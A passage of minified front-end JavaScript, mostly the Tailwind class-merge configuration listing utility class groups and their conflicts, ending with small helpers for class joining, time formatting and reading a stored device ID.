      , p = ne("font")
      , h = ne("text")
      , r = ne("font-weight")
      , S = ne("tracking")
      , R = ne("leading")
      , A = ne("breakpoint")
      , q = ne("container")
      , k = ne("spacing")
      , y = ne("radius")
      , C = ne("shadow")
      , $ = ne("inset-shadow")
      , tt = ne("text-shadow")
      , St = ne("drop-shadow")
      , Yt = ne("blur")
      , zt = ne("perspective")
      , Rt = ne("aspect")
      , re = ne("ease")
      , Tt = ne("animate")
      , Gt = () => ["auto", "avoid", "all", "avoid-page", "page", "left", "right", "column"]
      , Zt = () => ["center", "top", "bottom", "left", "right", "top-left", "left-top", "top-right", "right-top", "bottom-right", "right-bottom", "bottom-left", "left-bottom"]
      , ot = () => [...Zt(), Z, L]
      , Dt = () => ["auto", "hidden", "clip", "visible", "scroll"]
      , Mt = () => ["auto", "contain", "none"]
      , D = () => [Z, L, k]
      , st = () => [oa, "full", "auto", ...D()]
      , $e = () => [pl, "none", "subgrid", Z, L]
      , xe = () => ["auto", {
        span: ["full", pl, Z, L]
      }, pl, Z, L]
      , Qt = () => [pl, "auto", Z, L]
      , Te = () => ["auto", "min", "max", "fr", Z, L]
      , je = () => ["start", "end", "center", "between", "around", "evenly", "stretch", "baseline", "center-safe", "end-safe"]
      , qt = () => ["start", "end", "center", "stretch", "center-safe", "end-safe"]
      , T = () => ["auto", ...D()]
      , w = () => [oa, "auto", "full", "dvw", "dvh", "lvw", "lvh", "svw", "svh", "min", "max", "fit", ...D()]
      , W = () => [oa, "screen", "full", "dvw", "lvw", "svw", "min", "max", "fit", ...D()]
      , yt = () => [oa, "screen", "full", "lh", "dvh", "lvh", "svh", "min", "max", "fit", ...D()]
      , o = () => [c, Z, L]
      , O = () => [...Zt(), g0, h0, {
        position: [Z, L]
      }]
      , X = () => ["no-repeat", {
        repeat: ["", "x", "y", "space", "round"]
      }]
      , B = () => ["auto", "cover", "contain", Dg, Mg, {
        size: [Z, L]
      }]
      , J = () => [nr, yi, ja]
      , lt = () => ["", "none", "full", y, Z, L]
      , V = () => ["", pt, yi, ja]
      , Jt = () => ["solid", "dashed", "dotted", "double"]
      , _t = () => ["normal", "multiply", "screen", "overlay", "darken", "lighten", "color-dodge", "color-burn", "hard-light", "soft-light", "difference", "exclusion", "hue", "saturation", "color", "luminosity"]
      , Ot = () => [pt, nr, g0, h0]
      , hl = () => ["", "none", Yt, Z, L]
      , _e = () => ["none", pt, Z, L]
      , ll = () => ["none", pt, Z, L]
      , Q = () => [pt, Z, L]
      , Se = () => [oa, "full", ...D()];
    return {
      cacheSize: 500,
      theme: {
        animate: ["spin", "ping", "pulse", "bounce"],
        aspect: ["video"],
        blur: [Cl],
        breakpoint: [Cl],
        color: [j0],
        container: [Cl],
        "drop-shadow": [Cl],
        ease: ["in", "out", "in-out"],
        font: [Eg],
        "font-weight": ["thin", "extralight", "light", "normal", "medium", "semibold", "bold", "extrabold", "black"],
        "inset-shadow": [Cl],
        leading: ["none", "tight", "snug", "normal", "relaxed", "loose"],
        perspective: ["dramatic", "near", "normal", "midrange", "distant", "none"],
        radius: [Cl],
        shadow: [Cl],
        spacing: ["px", pt],
        text: [Cl],
        "text-shadow": [Cl],
        tracking: ["tighter", "tight", "normal", "wide", "wider", "widest"]
      },
      classGroups: {
        aspect: [{
          aspect: ["auto", "square", oa, L, Z, Rt]
        }],
        container: ["container"],
        "container-type": [{
          "@container": ["", "normal", "size", Z, L]
        }],
        "container-named": [Ag],
        columns: [{
          columns: [pt, L, Z, q]
        }],
        "break-after": [{
          "break-after": Gt()
        }],
        "break-before": [{
          "break-before": Gt()
        }],
        "break-inside": [{
          "break-inside": ["auto", "avoid", "avoid-page", "avoid-column"]
        }],
        "box-decoration": [{
          "box-decoration": ["slice", "clone"]
        }],
        box: [{
          box: ["border", "content"]
        }],
        display: ["block", "inline-block", "inline", "flex", "inline-flex", "table", "inline-table", "table-caption", "table-cell", "table-column", "table-column-group", "table-footer-group", "table-header-group", "table-row-group", "table-row", "flow-root", "grid", "inline-grid", "contents", "list-item", "hidden"],
        sr: ["sr-only", "not-sr-only"],
        float: [{
          float: ["right", "left", "none", "start", "end"]
        }],
        clear: [{
          clear: ["left", "right", "both", "none", "start", "end"]
        }],
        isolation: ["isolate", "isolation-auto"],
        "object-fit": [{
          object: ["contain", "cover", "fill", "none", "scale-down"]
        }],
        "object-position": [{
          object: ot()
        }],
        overflow: [{
          overflow: Dt()
        }],
        "overflow-x": [{
          "overflow-x": Dt()
        }],
        "overflow-y": [{
          "overflow-y": Dt()
        }],
        overscroll: [{
          overscroll: Mt()
        }],
        "overscroll-x": [{
          "overscroll-x": Mt()
        }],
        "overscroll-y": [{
          "overscroll-y": Mt()
        }],
        position: ["static", "fixed", "absolute", "relative", "sticky"],
        inset: [{
          inset: st()
        }],
        "inset-x": [{
          "inset-x": st()
        }],
        "inset-y": [{
          "inset-y": st()
        }],
        start: [{
          "inset-s": st(),
          start: st()
        }],
        end: [{
          "inset-e": st(),
          end: st()
        }],
        "inset-bs": [{
          "inset-bs": st()
        }],
        "inset-be": [{
          "inset-be": st()
        }],
        top: [{
          top: st()
        }],
        right: [{
          right: st()
        }],
        bottom: [{
          bottom: st()
        }],
        left: [{
          left: st()
        }],
        visibility: ["visible", "invisible", "collapse"],
        z: [{
          z: [pl, "auto", Z, L]
        }],
        basis: [{
          basis: [oa, "full", "auto", q, ...D()]
        }],
        "flex-direction": [{
          flex: ["row", "row-reverse", "col", "col-reverse"]
        }],
        "flex-wrap": [{
          flex: ["nowrap", "wrap", "wrap-reverse"]
        }],
        flex: [{
          flex: [pt, oa, "auto", "initial", "none", L]
        }],
        grow: [{
          grow: ["", pt, Z, L]
        }],
        shrink: [{
          shrink: ["", pt, Z, L]
        }],
        order: [{
          order: [pl, "first", "last", "none", Z, L]
        }],
        "grid-cols": [{
          "grid-cols": $e()
        }],
        "col-start-end": [{
          col: xe()
        }],
        "col-start": [{
          "col-start": Qt()
        }],
        "col-end": [{
          "col-end": Qt()
        }],
        "grid-rows": [{
          "grid-rows": $e()
        }],
        "row-start-end": [{
          row: xe()
        }],
        "row-start": [{
          "row-start": Qt()
        }],
        "row-end": [{
          "row-end": Qt()
        }],
        "grid-flow": [{
          "grid-flow": ["row", "col", "dense", "row-dense", "col-dense"]
        }],
        "auto-cols": [{
          "auto-cols": Te()
        }],
        "auto-rows": [{
          "auto-rows": Te()
        }],
        gap: [{
          gap: D()
        }],
        "gap-x": [{
          "gap-x": D()
        }],
        "gap-y": [{
          "gap-y": D()
        }],
        "justify-content": [{
          justify: [...je(), "normal"]
        }],
        "justify-items": [{
          "justify-items": [...qt(), "normal"]
        }],
        "justify-self": [{
          "justify-self": ["auto", ...qt()]
        }],
        "align-content": [{
          content: ["normal", ...je()]
        }],
        "align-items": [{
          items: [...qt(), {
            baseline: ["", "last"]
          }]
        }],
        "align-self": [{
          self: ["auto", ...qt(), {
            baseline: ["", "last"]
          }]
        }],
        "place-content": [{
          "place-content": je()
        }],
        "place-items": [{
          "place-items": [...qt(), "baseline"]
        }],
        "place-self": [{
          "place-self": ["auto", ...qt()]
        }],
        p: [{
          p: D()
        }],
        px: [{
          px: D()
        }],
        py: [{
          py: D()
        }],
        ps: [{
          ps: D()
        }],
        pe: [{
          pe: D()
        }],
        pbs: [{
          pbs: D()
        }],
        pbe: [{
          pbe: D()
        }],
        pt: [{
          pt: D()
        }],
        pr: [{
          pr: D()
        }],
        pb: [{
          pb: D()
        }],
        pl: [{
          pl: D()
        }],
        m: [{
          m: T()
        }],
        mx: [{
          mx: T()
        }],
        my: [{
          my: T()
        }],
        ms: [{
          ms: T()
        }],
        me: [{
          me: T()
        }],
        mbs: [{
          mbs: T()
        }],
        mbe: [{
          mbe: T()
        }],
        mt: [{
          mt: T()
        }],
        mr: [{
          mr: T()
        }],
        mb: [{
          mb: T()
        }],
        ml: [{
          ml: T()
        }],
        "space-x": [{
          "space-x": D()
        }],
        "space-x-reverse": ["space-x-reverse"],
        "space-y": [{
          "space-y": D()
        }],
        "space-y-reverse": ["space-y-reverse"],
        size: [{
          size: w()
        }],
        "inline-size": [{
          inline: ["auto", ...W()]
        }],
        "min-inline-size": [{
          "min-inline": ["auto", ...W()]
        }],
        "max-inline-size": [{
          "max-inline": ["none", ...W()]
        }],
        "block-size": [{
          block: ["auto", ...yt()]
        }],
        "min-block-size": [{
          "min-block": ["auto", ...yt()]
        }],
        "max-block-size": [{
          "max-block": ["none", ...yt()]
        }],
        w: [{
          w: [q, "screen", ...w()]
        }],
        "min-w": [{
          "min-w": [q, "screen", "none", ...w()]
        }],
        "max-w": [{
          "max-w": [q, "screen", "none", "prose", {
            screen: [A]
          }, ...w()]
        }],
        h: [{
          h: ["screen", "lh", ...w()]
        }],
        "min-h": [{
          "min-h": ["screen", "lh", "none", ...w()]
        }],
        "max-h": [{
          "max-h": ["screen", "lh", ...w()]
        }],
        "font-size": [{
          text: ["base", h, yi, ja]
        }],
        "font-smoothing": ["antialiased", "subpixel-antialiased"],
        "font-style": ["italic", "not-italic"],
        "font-weight": [{
          font: [r, Ug, Og]
        }],
        "font-stretch": [{
          "font-stretch": ["ultra-condensed", "extra-condensed", "condensed", "semi-condensed", "normal", "semi-expanded", "expanded", "extra-expanded", "ultra-expanded", nr, L]
        }],
        "font-family": [{
          font: [jg, Rg, p]
        }],
        "font-features": [{
          "font-features": [L]
        }],
        "fvn-normal": ["normal-nums"],
        "fvn-ordinal": ["ordinal"],
        "fvn-slashed-zero": ["slashed-zero"],
        "fvn-figure": ["lining-nums", "oldstyle-nums"],
        "fvn-spacing": ["proportional-nums", "tabular-nums"],
        "fvn-fraction": ["diagonal-fractions", "stacked-fractions"],
        tracking: [{
          tracking: [S, Z, L]
        }],
        "line-clamp": [{
          "line-clamp": [pt, "none", Z, p0]
        }],
        leading: [{
          leading: [R, ...D()]
        }],
        "list-image": [{
          "list-image": ["none", Z, L]
        }],
        "list-style-position": [{
          list: ["inside", "outside"]
        }],
        "list-style-type": [{
          list: ["disc", "decimal", "none", Z, L]
        }],
        "text-alignment": [{
          text: ["left", "center", "right", "justify", "start", "end"]
        }],
        "placeholder-color": [{
          placeholder: o()
        }],
        "text-color": [{
          text: o()
        }],
        "text-decoration": ["underline", "overline", "line-through", "no-underline"],
        "text-decoration-style": [{
          decoration: [...Jt(), "wavy"]
        }],
        "text-decoration-thickness": [{
          decoration: [pt, "from-font", "auto", Z, ja]
        }],
        "text-decoration-color": [{
          decoration: o()
        }],
        "underline-offset": [{
          "underline-offset": [pt, "auto", Z, L]
        }],
        "text-transform": ["uppercase", "lowercase", "capitalize", "normal-case"],
        "text-overflow": ["truncate", "text-ellipsis", "text-clip"],
        "text-wrap": [{
          text: ["wrap", "nowrap", "balance", "pretty"]
        }],
        indent: [{
          indent: D()
        }],
        "tab-size": [{
          tab: [pl, Z, L]
        }],
        "vertical-align": [{
          align: ["baseline", "top", "middle", "bottom", "text-top", "text-bottom", "sub", "super", Z, L]
        }],
        whitespace: [{
          whitespace: ["normal", "nowrap", "pre", "pre-line", "pre-wrap", "break-spaces"]
        }],
        break: [{
          break: ["normal", "words", "all", "keep"]
        }],
        wrap: [{
          wrap: ["break-word", "anywhere", "normal"]
        }],
        hyphens: [{
          hyphens: ["none", "manual", "auto"]
        }],
        content: [{
          content: ["none", Z, L]
        }],
        "bg-attachment": [{
          bg: ["fixed", "local", "scroll"]
        }],
        "bg-clip": [{
          "bg-clip": ["border", "padding", "content", "text"]
        }],
        "bg-origin": [{
          "bg-origin": ["border", "padding", "content"]
        }],
        "bg-position": [{
          bg: O()
        }],
        "bg-repeat": [{
          bg: X()
        }],
        "bg-size": [{
          bg: B()
        }],
        "bg-image": [{
          bg: ["none", {
            linear: [{
              to: ["t", "tr", "r", "br", "b", "bl", "l", "tl"]
            }, pl, Z, L],
            radial: ["", Z, L],
            conic: [pl, Z, L]
          }, Cg, kg]
        }],
        "bg-color": [{
          bg: o()
        }],
        "gradient-from-pos": [{
          from: J()
        }],
        "gradient-via-pos": [{
          via: J()
        }],
        "gradient-to-pos": [{
          to: J()
        }],
        "gradient-from": [{
          from: o()
        }],
        "gradient-via": [{
          via: o()
        }],
        "gradient-to": [{
          to: o()
        }],
        rounded: [{
          rounded: lt()
        }],
        "rounded-s": [{
          "rounded-s": lt()
        }],
        "rounded-e": [{
          "rounded-e": lt()
        }],
        "rounded-t": [{
          "rounded-t": lt()
        }],
        "rounded-r": [{
          "rounded-r": lt()
        }],
        "rounded-b": [{
          "rounded-b": lt()
        }],
        "rounded-l": [{
          "rounded-l": lt()
        }],
        "rounded-ss": [{
          "rounded-ss": lt()
        }],
        "rounded-se": [{
          "rounded-se": lt()
        }],
        "rounded-ee": [{
          "rounded-ee": lt()
        }],
        "rounded-es": [{
          "rounded-es": lt()
        }],
        "rounded-tl": [{
          "rounded-tl": lt()
        }],
        "rounded-tr": [{
          "rounded-tr": lt()
        }],
        "rounded-br": [{
          "rounded-br": lt()
        }],
        "rounded-bl": [{
          "rounded-bl": lt()
        }],
        "border-w": [{
          border: V()
        }],
        "border-w-x": [{
          "border-x": V()
        }],
        "border-w-y": [{
          "border-y": V()
        }],
        "border-w-s": [{
          "border-s": V()
        }],
        "border-w-e": [{
          "border-e": V()
        }],
        "border-w-bs": [{
          "border-bs": V()
        }],
        "border-w-be": [{
          "border-be": V()
        }],
        "border-w-t": [{
          "border-t": V()
        }],
        "border-w-r": [{
          "border-r": V()
        }],
        "border-w-b": [{
          "border-b": V()
        }],
        "border-w-l": [{
          "border-l": V()
        }],
        "divide-x": [{
          "divide-x": V()
        }],
        "divide-x-reverse": ["divide-x-reverse"],
        "divide-y": [{
          "divide-y": V()
        }],
        "divide-y-reverse": ["divide-y-reverse"],
        "border-style": [{
          border: [...Jt(), "hidden", "none"]
        }],
        "divide-style": [{
          divide: [...Jt(), "hidden", "none"]
        }],
        "border-color": [{
          border: o()
        }],
        "border-color-x": [{
          "border-x": o()
        }],
        "border-color-y": [{
          "border-y": o()
        }],
        "border-color-s": [{
          "border-s": o()
        }],
        "border-color-e": [{
          "border-e": o()
        }],
        "border-color-bs": [{
          "border-bs": o()
        }],
        "border-color-be": [{
          "border-be": o()
        }],
        "border-color-t": [{
          "border-t": o()
        }],
        "border-color-r": [{
          "border-r": o()
        }],
        "border-color-b": [{
          "border-b": o()
        }],
        "border-color-l": [{
          "border-l": o()
        }],
        "divide-color": [{
          divide: o()
        }],
        "outline-style": [{
          outline: [...Jt(), "none", "hidden"]
        }],
        "outline-offset": [{
          "outline-offset": [pt, Z, L]
        }],
        "outline-w": [{
          outline: ["", pt, yi, ja]
        }],
        "outline-color": [{
          outline: o()
        }],
        shadow: [{
          shadow: ["", "none", C, wu, Uu]
        }],
        "shadow-color": [{
          shadow: o()
        }],
        "inset-shadow": [{
          "inset-shadow": ["none", $, wu, Uu]
        }],
        "inset-shadow-color": [{
          "inset-shadow": o()
        }],
        "ring-w": [{
          ring: V()
        }],
        "ring-w-inset": ["ring-inset"],
        "ring-color": [{
          ring: o()
        }],
        "ring-offset-w": [{
          "ring-offset": [pt, ja]
        }],
        "ring-offset-color": [{
          "ring-offset": o()
        }],
        "inset-ring-w": [{
          "inset-ring": V()
        }],
        "inset-ring-color": [{
          "inset-ring": o()
        }],
        "text-shadow": [{
          "text-shadow": ["none", tt, wu, Uu]
        }],
        "text-shadow-color": [{
          "text-shadow": o()
        }],
        opacity: [{
          opacity: [pt, Z, L]
        }],
        "mix-blend": [{
          "mix-blend": [..._t(), "plus-darker", "plus-lighter"]
        }],
        "bg-blend": [{
          "bg-blend": _t()
        }],
        "mask-clip": [{
          "mask-clip": ["border", "padding", "content", "fill", "stroke", "view"]
        }, "mask-no-clip"],
        "mask-composite": [{
          mask: ["add", "subtract", "intersect", "exclude"]
        }],
        "mask-image-linear-pos": [{
          "mask-linear": [pt]
        }],
        "mask-image-linear-from-pos": [{
          "mask-linear-from": Ot()
        }],
        "mask-image-linear-to-pos": [{
          "mask-linear-to": Ot()
        }],
        "mask-image-linear-from-color": [{
          "mask-linear-from": o()
        }],
        "mask-image-linear-to-color": [{
          "mask-linear-to": o()
        }],
        "mask-image-t-from-pos": [{
          "mask-t-from": Ot()
        }],
        "mask-image-t-to-pos": [{
          "mask-t-to": Ot()
        }],
        "mask-image-t-from-color": [{
          "mask-t-from": o()
        }],
        "mask-image-t-to-color": [{
          "mask-t-to": o()
        }],
        "mask-image-r-from-pos": [{
          "mask-r-from": Ot()
        }],
        "mask-image-r-to-pos": [{
          "mask-r-to": Ot()
        }],
        "mask-image-r-from-color": [{
          "mask-r-from": o()
        }],
        "mask-image-r-to-color": [{
          "mask-r-to": o()
        }],
        "mask-image-b-from-pos": [{
          "mask-b-from": Ot()
        }],
        "mask-image-b-to-pos": [{
          "mask-b-to": Ot()
        }],
        "mask-image-b-from-color": [{
          "mask-b-from": o()
        }],
        "mask-image-b-to-color": [{
          "mask-b-to": o()
        }],
        "mask-image-l-from-pos": [{
          "mask-l-from": Ot()
        }],
        "mask-image-l-to-pos": [{
          "mask-l-to": Ot()
        }],
        "mask-image-l-from-color": [{
          "mask-l-from": o()
        }],
        "mask-image-l-to-color": [{
          "mask-l-to": o()
        }],
        "mask-image-x-from-pos": [{
          "mask-x-from": Ot()
        }],
        "mask-image-x-to-pos": [{
          "mask-x-to": Ot()
        }],
        "mask-image-x-from-color": [{
          "mask-x-from": o()
        }],
        "mask-image-x-to-color": [{
          "mask-x-to": o()
        }],
        "mask-image-y-from-pos": [{
          "mask-y-from": Ot()
        }],
        "mask-image-y-to-pos": [{
          "mask-y-to": Ot()
        }],
        "mask-image-y-from-color": [{
          "mask-y-from": o()
        }],
        "mask-image-y-to-color": [{
          "mask-y-to": o()
        }],
        "mask-image-radial": [{
          "mask-radial": [Z, L]
        }],
        "mask-image-radial-from-pos": [{
          "mask-radial-from": Ot()
        }],
        "mask-image-radial-to-pos": [{
          "mask-radial-to": Ot()
        }],
        "mask-image-radial-from-color": [{
          "mask-radial-from": o()
        }],
        "mask-image-radial-to-color": [{
          "mask-radial-to": o()
        }],
        "mask-image-radial-shape": [{
          "mask-radial": ["circle", "ellipse"]
        }],
        "mask-image-radial-size": [{
          "mask-radial": [{
            closest: ["side", "corner"],
            farthest: ["side", "corner"]
          }]
        }],
        "mask-image-radial-pos": [{
          "mask-radial-at": Zt()
        }],
        "mask-image-conic-pos": [{
          "mask-conic": [pt]
        }],
        "mask-image-conic-from-pos": [{
          "mask-conic-from": Ot()
        }],
        "mask-image-conic-to-pos": [{
          "mask-conic-to": Ot()
        }],
        "mask-image-conic-from-color": [{
          "mask-conic-from": o()
        }],
        "mask-image-conic-to-color": [{
          "mask-conic-to": o()
        }],
        "mask-mode": [{
          mask: ["alpha", "luminance", "match"]
        }],
        "mask-origin": [{
          "mask-origin": ["border", "padding", "content", "fill", "stroke", "view"]
        }],
        "mask-position": [{
          mask: O()
        }],
        "mask-repeat": [{
          mask: X()
        }],
        "mask-size": [{
          mask: B()
        }],
        "mask-type": [{
          "mask-type": ["alpha", "luminance"]
        }],
        "mask-image": [{
          mask: ["none", Z, L]
        }],
        filter: [{
          filter: ["", "none", Z, L]
        }],
        blur: [{
          blur: hl()
        }],
        brightness: [{
          brightness: [pt, Z, L]
        }],
        contrast: [{
          contrast: [pt, Z, L]
        }],
        "drop-shadow": [{
          "drop-shadow": ["", "none", St, wu, Uu]
        }],
        "drop-shadow-color": [{
          "drop-shadow": o()
        }],
        grayscale: [{
          grayscale: ["", pt, Z, L]
        }],
        "hue-rotate": [{
          "hue-rotate": [pt, Z, L]
        }],
        invert: [{
          invert: ["", pt, Z, L]
        }],
        saturate: [{
          saturate: [pt, Z, L]
        }],
        sepia: [{
          sepia: ["", pt, Z, L]
        }],
        "backdrop-filter": [{
          "backdrop-filter": ["", "none", Z, L]
        }],
        "backdrop-blur": [{
          "backdrop-blur": hl()
        }],
        "backdrop-brightness": [{
          "backdrop-brightness": [pt, Z, L]
        }],
        "backdrop-contrast": [{
          "backdrop-contrast": [pt, Z, L]
        }],
        "backdrop-grayscale": [{
          "backdrop-grayscale": ["", pt, Z, L]
        }],
        "backdrop-hue-rotate": [{
          "backdrop-hue-rotate": [pt, Z, L]
        }],
        "backdrop-invert": [{
          "backdrop-invert": ["", pt, Z, L]
        }],
        "backdrop-opacity": [{
          "backdrop-opacity": [pt, Z, L]
        }],
        "backdrop-saturate": [{
          "backdrop-saturate": [pt, Z, L]
        }],
        "backdrop-sepia": [{
          "backdrop-sepia": ["", pt, Z, L]
        }],
        "border-collapse": [{
          border: ["collapse", "separate"]
        }],
        "border-spacing": [{
          "border-spacing": D()
        }],
        "border-spacing-x": [{
          "border-spacing-x": D()
        }],
        "border-spacing-y": [{
          "border-spacing-y": D()
        }],
        "table-layout": [{
          table: ["auto", "fixed"]
        }],
        caption: [{
          caption: ["top", "bottom"]
        }],
        transition: [{
          transition: ["", "all", "colors", "opacity", "shadow", "transform", "none", Z, L]
        }],
        "transition-behavior": [{
          transition: ["normal", "discrete"]
        }],
        duration: [{
          duration: [pt, "initial", Z, L]
        }],
        ease: [{
          ease: ["linear", "initial", re, Z, L]
        }],
        delay: [{
          delay: [pt, Z, L]
        }],
        animate: [{
          animate: ["none", Tt, Z, L]
        }],
        backface: [{
          backface: ["hidden", "visible"]
        }],
        perspective: [{
          perspective: [zt, Z, L]
        }],
        "perspective-origin": [{
          "perspective-origin": ot()
        }],
        rotate: [{
          rotate: _e()
        }],
        "rotate-x": [{
          "rotate-x": _e()
        }],
        "rotate-y": [{
          "rotate-y": _e()
        }],
        "rotate-z": [{
          "rotate-z": _e()
        }],
        scale: [{
          scale: ll()
        }],
        "scale-x": [{
          "scale-x": ll()
        }],
        "scale-y": [{
          "scale-y": ll()
        }],
        "scale-z": [{
          "scale-z": ll()
        }],
        "scale-3d": ["scale-3d"],
        skew: [{
          skew: Q()
        }],
        "skew-x": [{
          "skew-x": Q()
        }],
        "skew-y": [{
          "skew-y": Q()
        }],
        transform: [{
          transform: [Z, L, "", "none", "gpu", "cpu"]
        }],
        "transform-origin": [{
          origin: ot()
        }],
        "transform-style": [{
          transform: ["3d", "flat"]
        }],
        translate: [{
          translate: Se()
        }],
        "translate-x": [{
          "translate-x": Se()
        }],
        "translate-y": [{
          "translate-y": Se()
        }],
        "translate-z": [{
          "translate-z": Se()
        }],
        "translate-none": ["translate-none"],
        zoom: [{
          zoom: [pl, Z, L]
        }],
        accent: [{
          accent: o()
        }],
        appearance: [{
          appearance: ["none", "auto"]
        }],
        "caret-color": [{
          caret: o()
        }],
        "color-scheme": [{
          scheme: ["normal", "dark", "light", "light-dark", "only-dark", "only-light"]
        }],
        cursor: [{
          cursor: ["auto", "default", "pointer", "wait", "text", "move", "help", "not-allowed", "none", "context-menu", "progress", "cell", "crosshair", "vertical-text", "alias", "copy", "no-drop", "grab", "grabbing", "all-scroll", "col-resize", "row-resize", "n-resize", "e-resize", "s-resize", "w-resize", "ne-resize", "nw-resize", "se-resize", "sw-resize", "ew-resize", "ns-resize", "nesw-resize", "nwse-resize", "zoom-in", "zoom-out", Z, L]
        }],
        "field-sizing": [{
          "field-sizing": ["fixed", "content"]
        }],
        "pointer-events": [{
          "pointer-events": ["auto", "none"]
        }],
        resize: [{
          resize: ["none", "", "y", "x"]
        }],
        "scroll-behavior": [{
          scroll: ["auto", "smooth"]
        }],
        "scrollbar-thumb-color": [{
          "scrollbar-thumb": o()
        }],
        "scrollbar-track-color": [{
          "scrollbar-track": o()
        }],
        "scrollbar-gutter": [{
          "scrollbar-gutter": ["auto", "stable", "both"]
        }],
        "scrollbar-w": [{
          scrollbar: ["auto", "thin", "none"]
        }],
        "scroll-m": [{
          "scroll-m": D()
        }],
        "scroll-mx": [{
          "scroll-mx": D()
        }],
        "scroll-my": [{
          "scroll-my": D()
        }],
        "scroll-ms": [{
          "scroll-ms": D()
        }],
        "scroll-me": [{
          "scroll-me": D()
        }],
        "scroll-mbs": [{
          "scroll-mbs": D()
        }],
        "scroll-mbe": [{
          "scroll-mbe": D()
        }],
        "scroll-mt": [{
          "scroll-mt": D()
        }],
        "scroll-mr": [{
          "scroll-mr": D()
        }],
        "scroll-mb": [{
          "scroll-mb": D()
        }],
        "scroll-ml": [{
          "scroll-ml": D()
        }],
        "scroll-p": [{
          "scroll-p": D()
        }],
        "scroll-px": [{
          "scroll-px": D()
        }],
        "scroll-py": [{
          "scroll-py": D()
        }],
        "scroll-ps": [{
          "scroll-ps": D()
        }],
        "scroll-pe": [{
          "scroll-pe": D()
        }],
        "scroll-pbs": [{
          "scroll-pbs": D()
        }],
        "scroll-pbe": [{
          "scroll-pbe": D()
        }],
        "scroll-pt": [{
          "scroll-pt": D()
        }],
        "scroll-pr": [{
          "scroll-pr": D()
        }],
        "scroll-pb": [{
          "scroll-pb": D()
        }],
        "scroll-pl": [{
          "scroll-pl": D()
        }],
        "snap-align": [{
          snap: ["start", "end", "center", "align-none"]
        }],
        "snap-stop": [{
          snap: ["normal", "always"]
        }],
        "snap-type": [{
          snap: ["none", "x", "y", "both"]
        }],
        "snap-strictness": [{
          snap: ["mandatory", "proximity"]
        }],
        touch: [{
          touch: ["auto", "none", "manipulation"]
        }],
        "touch-x": [{
          "touch-pan": ["x", "left", "right"]
        }],
        "touch-y": [{
          "touch-pan": ["y", "up", "down"]
        }],
        "touch-pz": ["touch-pinch-zoom"],
        select: [{
          select: ["none", "text", "all", "auto"]
        }],
        "will-change": [{
          "will-change": ["auto", "scroll", "contents", "transform", Z, L]
        }],
        fill: [{
          fill: ["none", ...o()]
        }],
        "stroke-w": [{
          stroke: [pt, yi, ja, p0]
        }],
        stroke: [{
          stroke: ["none", ...o()]
        }],
        "forced-color-adjust": [{
          "forced-color-adjust": ["auto", "none"]
        }]
      },
      conflictingClassGroups: {
        "container-named": ["container-type"],
        overflow: ["overflow-x", "overflow-y"],
        overscroll: ["overscroll-x", "overscroll-y"],
        inset: ["inset-x", "inset-y", "inset-bs", "inset-be", "start", "end", "top", "right", "bottom", "left"],
        "inset-x": ["right", "left"],
        "inset-y": ["top", "bottom"],
        flex: ["basis", "grow", "shrink"],
        gap: ["gap-x", "gap-y"],
        p: ["px", "py", "ps", "pe", "pbs", "pbe", "pt", "pr", "pb", "pl"],
        px: ["pr", "pl"],
        py: ["pt", "pb"],
        m: ["mx", "my", "ms", "me", "mbs", "mbe", "mt", "mr", "mb", "ml"],
        mx: ["mr", "ml"],
        my: ["mt", "mb"],
        size: ["w", "h"],
        "font-size": ["leading"],
        "fvn-normal": ["fvn-ordinal", "fvn-slashed-zero", "fvn-figure", "fvn-spacing", "fvn-fraction"],
        "fvn-ordinal": ["fvn-normal"],
        "fvn-slashed-zero": ["fvn-normal"],
        "fvn-figure": ["fvn-normal"],
        "fvn-spacing": ["fvn-normal"],
        "fvn-fraction": ["fvn-normal"],
        "line-clamp": ["display", "overflow"],
        rounded: ["rounded-s", "rounded-e", "rounded-t", "rounded-r", "rounded-b", "rounded-l", "rounded-ss", "rounded-se", "rounded-ee", "rounded-es", "rounded-tl", "rounded-tr", "rounded-br", "rounded-bl"],
        "rounded-s": ["rounded-ss", "rounded-es"],
        "rounded-e": ["rounded-se", "rounded-ee"],
        "rounded-t": ["rounded-tl", "rounded-tr"],
        "rounded-r": ["rounded-tr", "rounded-br"],
        "rounded-b": ["rounded-br", "rounded-bl"],
        "rounded-l": ["rounded-tl", "rounded-bl"],
        "border-spacing": ["border-spacing-x", "border-spacing-y"],
        "border-w": ["border-w-x", "border-w-y", "border-w-s", "border-w-e", "border-w-bs", "border-w-be", "border-w-t", "border-w-r", "border-w-b", "border-w-l"],
        "border-w-x": ["border-w-r", "border-w-l"],
        "border-w-y": ["border-w-t", "border-w-b"],
        "border-color": ["border-color-x", "border-color-y", "border-color-s", "border-color-e", "border-color-bs", "border-color-be", "border-color-t", "border-color-r", "border-color-b", "border-color-l"],
        "border-color-x": ["border-color-r", "border-color-l"],
        "border-color-y": ["border-color-t", "border-color-b"],
        translate: ["translate-x", "translate-y", "translate-none"],
        "translate-none": ["translate", "translate-x", "translate-y", "translate-z"],
        "scroll-m": ["scroll-mx", "scroll-my", "scroll-ms", "scroll-me", "scroll-mbs", "scroll-mbe", "scroll-mt", "scroll-mr", "scroll-mb", "scroll-ml"],
        "scroll-mx": ["scroll-mr", "scroll-ml"],
        "scroll-my": ["scroll-mt", "scroll-mb"],
        "scroll-p": ["scroll-px", "scroll-py", "scroll-ps", "scroll-pe", "scroll-pbs", "scroll-pbe", "scroll-pt", "scroll-pr", "scroll-pb", "scroll-pl"],
        "scroll-px": ["scroll-pr", "scroll-pl"],
        "scroll-py": ["scroll-pt", "scroll-pb"],
        touch: ["touch-x", "touch-y", "touch-pz"],
        "touch-x": ["touch"],
        "touch-y": ["touch"],
        "touch-pz": ["touch"]
      },
      conflictingClassGroupModifiers: {
        "font-size": ["leading"]
      },
      postfixLookupClassGroups: ["container-type"],
      orderSensitiveModifiers: ["*", "**", "after", "backdrop", "before", "details-content", "file", "first-letter", "first-line", "marker", "placeholder", "selection"]
    }
  }
  , qg = hg(Hg);
function ye(...c) {
  return qg(Kh(c))
}
const v0 = Math.max(10, sr() * 5)
  , ir = 10
  , b0 = 100;
function ur(c) {
  const p = Math.max(0, Math.floor(c / 1e3))
    , h = Math.floor(p / 3600)
    , r = Math.floor(p % 3600 / 60)
    , S = p % 60;
  return h > 0 ? `${h.toString().padStart(2, "0")}:${r.toString().padStart(2, "0")}:${S.toString().padStart(2, "0")}` : `${r.toString().padStart(2, "0")}:${S.toString().padStart(2, "0")}`
}
const y0 = "nfx_device_id";
function Bg() {
  try {
    const c = localStorage.getItem(y0);
    if (c)
      return c;
